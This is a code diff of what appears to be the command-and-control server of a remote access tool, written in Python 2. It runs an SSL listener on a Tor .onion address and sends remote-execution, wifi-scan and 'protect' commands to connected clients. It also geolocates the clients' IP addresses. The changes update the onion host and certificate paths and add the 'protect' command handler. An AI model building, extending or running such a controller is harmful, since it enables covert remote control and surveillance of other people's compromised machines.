@@ -1,12 +1,11 @@
-import socket, ssl, os, sys, time, hashlib, hmac, geoip2.database
+import socket, ssl, os, sys, time, hashlib, hmac, geoip2.database, subprocess
 from colored import fg, bg, attr
-from subprocess import Popen, PIPE, STDOUT
+from subprocess import Popen, PIPE, STDOUT, check_output
 from clint.textui import colored
-test = "test,testing"
-host = '3pnzzdpq7aj6s6b6.onion'
+host = 'hcjczulezpxxfw2n.onion'
 hasher = hashlib.sha256()
 try:
-    reader = geoip2.database.Reader('GeoLite2-City.mmdb')
+    reader = geoip2.database.Reader('/home/user/Scaricati/GeoLite2-City.mmdb')
 except:
     print "Can't load GEOIP2-Database"
 
@@ -38,7 +37,7 @@ def DigGeoIp(ip):
     response = reader.city(ip)
     country = response.country.name
     city = response.city.name
-    print "|--- " + ip + " " + city + " " + country
+    print "|-- " + ip + " " + city + " " + country
 
 def CheckHash(fileName,fileHashHEX):
     with open(fileName, 'rb') as inFile:
@@ -107,8 +106,8 @@ while True:
         try:
             connstream = ssl.wrap_socket(newsocket,
                                  server_side=True,
-                                 certfile="priv_dom2.crt",
-                                 keyfile="private_key.key")
+                                 certfile="certificate.pem",
+                                 keyfile="private_key")
         except ssl.SSLError:
             print "%s%s!!!WARNING!!! BAD CLIENT (or other SSL problem)%s" % (fg(9),attr(1),attr(0))
             break
@@ -130,7 +129,7 @@ while True:
 		ExecIN(inText.split("!")[1])
             elif inText.startswith('s-wifi'):
                 card = raw_input("[*] Enter wifi card name (usualy wlan0): ")
-                SendData("ScanWIFI : " + card)
+                SendData("ScanWIFI :" + card)
                 report = RecvData()
                 while report != "ScanWIFI-finished":
                     print "|--- " + report
@@ -141,9 +140,9 @@ while True:
                 print "---" + cType + "---"
                 while infos != "end-info":
                     if infos.startswith('ip'):
-			if infos.split(':')[1].startswith('Error'):
-			    print "|--- " + infos
-			else:
+                        if infos.split(':')[1].startswith('Error'):
+                            print "|--- " + infos
+                        else:
                             DigGeoIp(infos.split(':')[1])
                     else:
                         print "|--- " + infos
@@ -154,6 +153,14 @@ while True:
                 connstream.shutdown(socket.SHUT_RDWR)
                 connstream.close()
                 break
+            elif inText.startswith('protect'):
+                    SendData(inText)
+                    #print RecvData()
+                    #print RecvData()
+                    inText = RecvData()
+                    while inText != 'END':
+                        print inText
+                        inText = RecvData()
             elif inText.startswith("exec"):
                 SendData(inText)
                 print ""
